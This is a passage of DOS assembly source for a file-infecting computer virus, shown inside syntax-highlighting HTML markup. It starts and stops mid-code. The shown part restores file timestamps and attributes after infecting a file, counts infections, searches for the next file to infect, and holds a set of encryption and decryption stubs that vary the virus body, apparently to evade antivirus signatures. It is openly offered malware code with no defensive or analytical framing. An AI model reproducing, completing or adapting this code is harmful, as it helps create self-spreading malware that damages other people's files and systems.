  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">counter</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;add one</span><span class="sc0">

  
</span><span class="sc1">;-----------restore time/date---------------</span><span class="sc0">
</span><span class="sc5">restc</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                   </span><span class="sc1">;restore stamps</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                         </span><span class="sc1">;remember?</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">;we saved these!</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;-------------close--------------------------                          </span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                     </span><span class="sc1">;close file</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;go!</span><span class="sc0">


</span><span class="sc1">;------------restore attribs-----------------</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                   </span><span class="sc1">;set attribs</span><span class="sc0">
  </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">9Eh</span><span class="sc0">                     </span><span class="sc1">; !!!! name in DTA</span><span class="sc0">
  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;clear!</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">attribs</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;attribs in cl</span><span class="sc0">
  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                        </span><span class="sc1">;go</span><span class="sc0">

                                                  
  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc2">7</span><span class="sc0">    </span><span class="sc1">;this isnt completly</span><span class="sc0">
                                 </span><span class="sc1">;accurate due to the</span><span class="sc0">
                                 </span><span class="sc1">;the fact that it</span><span class="sc0">
                                 </span><span class="sc1">;counts fails from</span><span class="sc0">
                                 </span><span class="sc1">;infection checks</span><span class="sc0">
                                 </span><span class="sc1">;but i kinda like having</span><span class="sc0">
                                 </span><span class="sc1">;a semi random infection check </span><span class="sc0">
  </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">nope</span><span class="sc0">                        </span><span class="sc1">;and exit</span><span class="sc0">


</span><span class="sc1">;--------------next and infection check----------</span><span class="sc0">
</span><span class="sc5">next1</span><span class="sc4">:</span><span class="sc0">
  
  </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">                    </span><span class="sc1">;find next file</span><span class="sc0">
  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">find_next</span><span class="sc0">                  </span><span class="sc1">;continue!</span><span class="sc0">

</span><span class="sc1">;-----------our stock of cryptors------------</span><span class="sc0">

</span><span class="sc5">del</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">':('</span><span class="sc0">
  </span><span class="sc6">cli</span><span class="sc0">                            </span><span class="sc1">; 1</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">; 3</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">                        </span><span class="sc1">; 1 </span><span class="sc0">
  </span><span class="sc6">sti</span><span class="sc0">                            </span><span class="sc1">; 1</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; 3</span><span class="sc0">
  </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; 1 =10</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">c_start</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;  </span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Del1</span><span class="sc0">
</span><span class="sc5">Value0</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">crypt</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">lodsb</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
  </span><span class="sc6">Nop</span><span class="sc0">
  </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">Nop</span><span class="sc0">
  </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">Nop</span><span class="sc0">
  </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
  </span><span class="sc6">stosb</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">Nop</span><span class="sc0">
  </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">ret</span><span class="sc0">                            </span><span class="sc1">;21 !!!</span><span class="sc0">
  </span><span class="sc6">Nop</span><span class="sc0">
  </span><span class="sc6">Nop</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------</span><span class="sc0">

</span><span class="sc5">del1</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">':('</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">sti</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">c_start</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;  </span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt1</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Del2</span><span class="sc0">
</span><span class="sc5">Value1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">crypt1</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
 </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crypt1</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;21 !!!</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
</span><span class="sc1">;------------------------------------------</span><span class="sc0">
</span><span class="sc5">del2</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">':('</span><span class="sc0">
 </span><span class="sc6">cld</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">clc</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">c_start</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;  </span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt2</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Del3</span><span class="sc0">
</span><span class="sc5">Value2</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">crypt2</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">nop</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">nop</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">nop</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crypt2</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;21 !!!</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">del3</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">':('</span><span class="sc0">
  </span><span class="sc6">sti</span><span class="sc0">                           </span><span class="sc1">; 1</span><span class="sc0">
  </span><span class="sc6">nop</span><span class="sc0">                           </span><span class="sc1">; 1</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">; 3</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc0">                       </span><span class="sc1">; 1</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; 4=10                            </span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">c_start</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;  </span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt3</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Del4</span><span class="sc0">
</span><span class="sc5">Value3</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">crypt3</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crypt3</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;21 !!!</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
</span><span class="sc5">del4</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">':('</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; 3</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">; 1</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; 1</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; 1</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">            </span><span class="sc1">; 3</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; 1</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">c_start</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;  </span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt4</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Del5</span><span class="sc0">
</span><span class="sc5">Value4</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">crypt4</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
 </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">value</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crypt4</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;21 !!!</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">del5</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">':('</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">; 3</span><span class="sc0">
  </span><span class="sc6">nop</span><span class="sc0">                           </span><span class="sc1">; 1</span><span class="sc0">
  </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; 1 </span><span class="sc0">
  </span><span class="sc6">nop</span><span class="sc0">                           </span><span class="sc1">; 1</span><span class="sc0">
  </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">          </span><span class="sc1">; 3</span><span class="sc0">
  </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">; 1    ; = 10</span><span class="sc0">

  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">c_start</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;  </span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt5</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Del6</span><span class="sc0">
</span><span class="sc5">Value5</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">crypt5</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">Nop</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crypt5</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">;21 !!!</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">del6</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">':('</span><span class="sc0">
 </span><span class="sc6">sti</span><span class="sc0">                             </span><span class="sc1">; 1</span><span class="sc0">
 </span><span class="sc6">clc</span><span class="sc0">                             </span><span class="sc1">; 1</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; 3</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">; 1</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; 3</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; 1=10</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">c_start</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;  </span><span class="sc0">
  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">c_start</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt6</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
